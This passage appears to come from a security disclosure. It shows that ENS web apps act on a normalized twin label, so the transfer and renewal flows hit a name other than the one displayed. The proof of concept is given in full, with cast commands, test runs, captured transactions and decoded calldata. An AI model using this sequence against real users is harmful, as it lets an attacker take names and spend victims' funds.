AFTER   ownerOf("poccase23") = 0xc3457993…04AC   resolver 0x0            <- the DISPLAYED name moved
        ownerOf("PocCase23") = 0xD3eFE59A…9fc5   resolver 0x5239A812…
```

{% endstep %}

{% step %}

## The renewal arm, with its control

`toBulkRenewName` derives `label = "poccase24"` (section 9 runs that through the real component); the Manager sends `renew("poccase24", …)`.

```bash
register $APK $ATTACKER poccase24; register $APK $ATTACKER PocCase24
st $APK $REGY 'safeTransferFrom(address,address,uint256,uint256,bytes)' \
   $ATTACKER $VICTIM $(tokid PocCase24) 1 0x                                     # 0x1
st $VPK $REGR 'renew(string,uint64,address,bytes32)' poccase24 $DUR $USDC $REF     # 0x1
```

```
expiry("poccase24")  attacker's : 1818682927 -> 1850218927   +31,536,000   paid by the victim
expiry("PocCase24")  victim's   : 1818683049 -> 1818683049            0   still expiring
victim USDC                     :  967999916 ->  959999895      -8000021   = 8.000021 USDC
```

Control — same victim, same call, the label they hold:

```bash
st $VPK $REGR 'renew(string,uint64,address,bytes32)' PocCase24 $DUR $USDC $REF     # 0x1
```

```
expiry("PocCase24")  victim's   : 1818683049 -> 1850219049   +31,536,000   renewed
expiry("poccase24")  attacker's : 1850218927 -> 1850218927            0   untouched
victim USDC                     :  959999895 ->  951999874      -8000021
```

`renew` is permissionless by design — `features/renew/components/ThirdPartyRenewalDialog.tsx`, catalog string *"Renewing this name will add time to the current owner's registration. You won't gain ownership of the name, but you will make someone's day."* — so the call succeeds rather than reverting.
{% endstep %}

{% step %}

## Recovery

```bash
cast send --private-key $VPK --rpc-url $R $REGY \
  'safeTransferFrom(address,address,uint256,uint256,bytes)' $ATTACKER $VICTIM $(tokid poccase22) 1 0x
```

```
Error: execution reverted: ERC1155MissingApprovalForAll(0xD3eFE59A…9fc5, 0xc3457993…04AC)
owner afterwards: 0xc3457993C71c57F791feFCe0f62C008B146104AC
```

Selector census on the deployed registry, with both controls:

```bash
for sig in 'owner()(address)' 'admin()(address)' 'DEFAULT_ADMIN_ROLE()(bytes32)'; do
  echo "$sig -> $(cast call $REGY "$sig" --rpc-url $R 2>&1 | head -c 40)"; done
cast code $REGY --rpc-url $R > regy.hex
for sig in 'forceTransfer(uint256,address)' 'adminTransfer(uint256,address)' 'recover(uint256)' \
           'setOwner(uint256,address)' 'unregister(uint256)' 'setResolver(uint256,address)' 'zzzNotReal(uint256)'; do
  printf "  %-32s %s\n" "$sig" "$(grep -c "$(cast sig "$sig" | cut -c3-)" regy.hex)"; done
```

```
owner() / admin() / DEFAULT_ADMIN_ROLE()  -> execution reverted

  forceTransfer(uint256,address)      0
  adminTransfer(uint256,address)      0
  recover(uint256)                    0
  setOwner(uint256,address)           0
  unregister(uint256)                 1
  setResolver(uint256,address)        1     <- positive control
  zzzNotReal(uint256)                 0     <- negative control
```

`unregister` destroys the entry rather than returning it, and is callable by the holder — now the attacker. The registration also lapses at expiry, which the holder controls via `renew`.

Vocabulary check rather than a fixed word list: `recover`, `restore`, `revert`, `undo`, `rollback`, `reclaim`, `dispute`, `freeze`, `pause` were each grepped across `apps`, `packages`, `workers`, `docs`; `rescue`, `claw` and `emergency` return 0 files, and none of the others names a mechanism for reversing a name transfer.
{% endstep %}

{% step %}

## The Manager's substitution, through the real component

`poc/__poc_case_renew.test.tsx` renders the real `NamesTable` with one row copied verbatim from the live indexer, clicks *Select all* and *Renew*, and reads what `BulkRenewDialog` receives.

```bash
bash _out/rig/restore-probes.sh
cd apps/manager && <repo>/node_modules/.pnpm/node_modules/.bin/vitest run \
  src/features/dashboard/components/__poc_case_renew.test.tsx
```

```
 Test Files  1 passed (1)
      Tests  3 passed (3)

  displayed label                  : TeStinG.eth
  on-chain label owned by the user : "TeStinG"
  label sent to ETHRegistrar.renew : "testing"
  control (alaska.eth, already normalized) -> label "alaska"
  both twins selected -> labels ['testing','testing']
```

{% endstep %}

{% step %}

## The guard, and the independent reproduction

```bash
for f in $(find 'apps/portal/src/routes/$name' -name '*.tsx' ! -name '*.test.tsx'); do
  printf "  %-38s %s\n" "${f#apps/portal/src/routes/}" "$(grep -c isValidEnsName "$f")"; done | sort
grep -n 'isValidEnsName' 'apps/portal/src/routes/$name.tsx'
```

```
  $name/address.tsx 0        $name/change-resolver.tsx 0   $name/create-subname.tsx 0
  $name/edit-records.tsx 0   $name/fuses/burn.tsx 0        $name/fuses/index.tsx 0
  $name/history.tsx 0        $name/index.tsx 2             $name/ownership/index.tsx 0
  $name/ownership/transfer.tsx 0    $name/records.tsx 0    $name/registry.tsx 0
  $name/resolver.tsx 0       $name/roles/index.tsx 0       $name/subnames.tsx 0
  $name/token.tsx 0
                             (16 files; 15 at zero)

$name.tsx:19: import { isValidEnsName } from '@/utils/token/isNormalized'
$name.tsx:29:     if (isValidEnsName(name) && isTLD(name)) {
```

The whole browser sequence re-run from scratch on a fresh pair, `poc/poc_case_setup.sh 30` then `N=30 node poc/shoot_transfer_executed.mjs`:

```
keccak(poccase30) = 0xe6016d47127b6bb3b88b5239902b9764801c4320141b91742a3b925a95eb96a3
keccak(PocCase30) = 0xdb335b880581d0214babc7414c5b53885f344b1cbc0217e392dfbaa18b68b7f1

RUN A  /PocCase30.eth/ownership/transfer   app sent setResolver(0xe6016d47…96a3) = keccak("poccase30")
RUN B  /poccase31.eth/ownership/transfer   app sent setResolver(0xe34bcf8c…59f1) = keccak("poccase31")

AFTER  ownerOf("poccase30") = 0xc3457993…04AC  resolver 0x0            <- moved, not the URL's name
       ownerOf("PocCase30") = 0xD3eFE59A…9fc5  resolver 0x5239A812…    <- the URL's name, untouched
       ownerOf("poccase31") = 0xc3457993…04AC  resolver 0x0            <- control: the URL's name moved
       ownerOf("PocCase31") = 0xD3eFE59A…9fc5  resolver 0x5239A812…
rescue attempt on poccase30 -> ERC1155MissingApprovalForAll(0xD3eFE59A…9fc5, 0xc3457993…04AC)
```

{% endstep %}

{% step %}

## Deployed builds

```bash
curl -s https://explorer.ens.dev/assets/getLabel-DwFSWtPI.js                 # 200, 157 bytes
curl -s https://explorer.ens.dev/assets/useCanTransferName-BQ1QSnUv.js | grep -o 'getLabel-[A-Za-z0-9_-]*\.js'
curl -s https://explorer.ens.dev/assets/transfer-BFbGHt5B.js | grep -c 'detach-resolver'
curl -s https://app.ens.dev/assets/dashboard-D924J0Sn.js | grep -ao 'Ur=e=>{if(!Hr(e))return null[^}]*}[^}]*}'
```

```
import{n as e,t}from"./dist-xoCw0O5q.js";function n(n){let r=e(t(n))[0];if(!r||r.error)throw r?.error;
  return String.fromCodePoint(...r.input)}export{n as t};
getLabel-DwFSWtPI.js        <- useCanTransferName imports it; ROLE_CAN_TRANSFER_ADMIN present
1                           <- transfer chunk carries all four step ids
Ur=e=>{if(!Hr(e))return null;let t=Gt(e),n=e.normalizedName??t;
  return{displayName:t,label:n.replace(/\.eth$/i,``),name:n,currentExpiry:BigInt(e.expiryDate)}}
```

`getLabel-DwFSWtPI.js` is not named in `explorer.ens.dev/index.html` — it is a lazy chunk reached through the two chunks above. The grep was capable: the same search finds 139 `assets` references in that file.
{% endstep %}
{% endstepper %}

## Screenshots

| file                                           | shows                                                                                                                                                                                    |
| ---------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `11-transfer-page-PocCase22.png`               | `/PocCase22.eth/ownership/transfer` rendered — sidebar **PocCase22.eth**, the irreversibility warning, connected as `0xD3e…fc5`. The route `isValidEnsName` rejects on the profile page. |
| `12-recipient-filled-button-enabled.png`       | recipient echoed, **Detach the resolver** on by default, **Transfer name** enabled                                                                                                       |
| `13-step-modal-both-steps-named-PocCase22.png` | the two-step modal before **Start**                                                                                                                                                      |
| `14-modal-both-steps-complete.png`             | both steps complete, each labelled *"… - PocCase22.eth"*, **Done**                                                                                                                       |
| `15-ownership-after-says-owner-unchanged.png`  | `/PocCase22.eth/ownership` after the flow: **Owner `0xD3eF…9fc5`**, *"No recent activity"* — while `poccase22` is at `0xc345…04AC` with resolver `0x0`                                   |
| `16-…` – `17-control-ownership-after.png`      | the control run, same five frames, normalized URL                                                                                                                                        |
| `11-transfer-executed-wire.txt`                | the four `eth_sendTransaction` bodies the app emitted across both runs                                                                                                                   |

## Wire capture, inline

The four `eth_sendTransaction` bodies the app emitted across both runs, verbatim from the capturing proxy. Reproduced inline rather than attached.

```
Explorer transfer flow driven to completion in Chrome, 2026-08-19T13:25:41.392Z
recipient (attacker): 0xc3457993C71c57F791feFCe0f62C008B146104AC

RUN A  /PocCase22.eth/ownership/transfer   (URL label is un-normalized)
  Transfer name button enabled : true
  Detach-the-resolver switch   : checked
  step labels in the modal     : []
  /PocCase22.eth/ownership afterwards reports Owner: null

RUN B  /poccase23.eth/ownership/transfer   (control: only the case of the URL label differs)
  Transfer name button enabled : true
  Detach-the-resolver switch   : checked
  step labels in the modal     : []
  /poccase23.eth/ownership afterwards reports Owner: null

eth_sendTransaction bodies the app emitted (4):
{"jsonrpc":"2.0","id":24,"method":"eth_sendTransaction","params":[{"data":"0xbc7b6d6232fbc8d572e558e7d8c7eb72d2d2dd2903882f31342fde081bde1b1e553997100000000000000000000000000000000000000000000000000000000000000000","from":"0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5","to":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2"}]}
{"jsonrpc":"2.0","id":29,"method":"eth_sendTransaction","params":[{"data":"0xf242432a000000000000000000000000d3efe59ae7cd70f39fb04c51a667fdd7f6f29fc5000000000000000000000000c3457993c71c57f791fefce0f62c008b146104ac32fbc8d572e558e7d8c7eb72d2d2dd2903882f31342fde081bde1b1e00000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000","from":"0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5","to":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4f0e2","value":"0x0"}]}
{"jsonrpc":"2.0","id":24,"method":"eth_sendTransaction","params":[{"data":"0xbc7b6d62227117e4eccc13b347baf977f793629df21683810bcc1c9df4ff732ae97060360000000000000000000000000000000000000000000000000000000000000000","from":"0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5","to":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2"}]}
{"jsonrpc":"2.0","id":29,"method":"eth_sendTransaction","params":[{"data":"0xf242432a000000000000000000000000d3efe59ae7cd70f39fb04c51a667fdd7f6f29fc5000000000000000000000000c3457993c71c57f791fefce0f62c008b146104ac227117e4eccc13b347baf977f793629df21683810bcc1c9df4ff732ae9706036000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000","from":"0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5","to":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","value":"0x0"}]}
```

Decoded, with the labelhashes computed independently (`cast keccak`):

```
keccak("poccase22") = 0x32fbc8d572e558e7d8c7eb72d2d2dd2903882f31342fde081bde1b1e55399710
keccak("PocCase22") = 0xf71cc8408535022f9f89f21af0b8f9976fa2ae4003d9db75b04a8786c5bd0964
keccak("poccase23") = 0x227117e4eccc13b347baf977f793629df21683810bcc1c9df4ff732ae9706036

RUN A  /PocCase22.eth  (URL label un-normalized)
  tx1 0xbc7b6d62 setResolver(uint256,address)
        arg0 32fbc8d5…55399710  = keccak("poccase22")   <- NOT the displayed name
        arg1 0x0
  tx2 0xf242432a safeTransferFrom(address,address,uint256,uint256,bytes)
        from 0xd3efe59a…9fc5 (victim)   to 0xc3457993…04ac (attacker)
        id   32fbc8d5…1bde1b1e00000000 = keccak("poccase22") with the low 32 bits cleared
  keccak("PocCase22") = 0xf71cc840… : 0 occurrences anywhere in the capture

RUN B  /poccase23.eth  (control: only the case of the URL label differs)
  tx3 setResolver(arg0 227117e4…e9706036 = keccak("poccase23"), 0x0)
  tx4 safeTransferFrom(victim, attacker, 227117e4…f4ff732a00000000, 1, "")
        the control moves the name that was displayed
```

Two fields in the capture read empty and are **not** evidence: `step labels in the modal : []` and `reports Owner: null`. Those are misses by the scraper's DOM selectors — the modal step labels render in a portal and the ownership page loads its owner asynchronously after the scrape. Both facts rest on the screenshots (`14-`, `15-`) and, for the owner, on the on-chain `ownerOf` readings above, not on this file.

## Not exercised

* `detach-registry` and `set-eth-addr` derive their label from the same `getLabel(name)` at `useTransferName.ts:132` but were not run.
* `useRenewalTransactions.ts:197` (the Explorer's own `renew`), the three register-pricing sites, and `routes/$name/subnames.tsx:210,268` consume `getLabel` the same way and were not driven.
* The Manager's dashboard was not driven in a browser against a divergent row; that arm rests on the real component (section 9) and the on-chain execution (section 7).
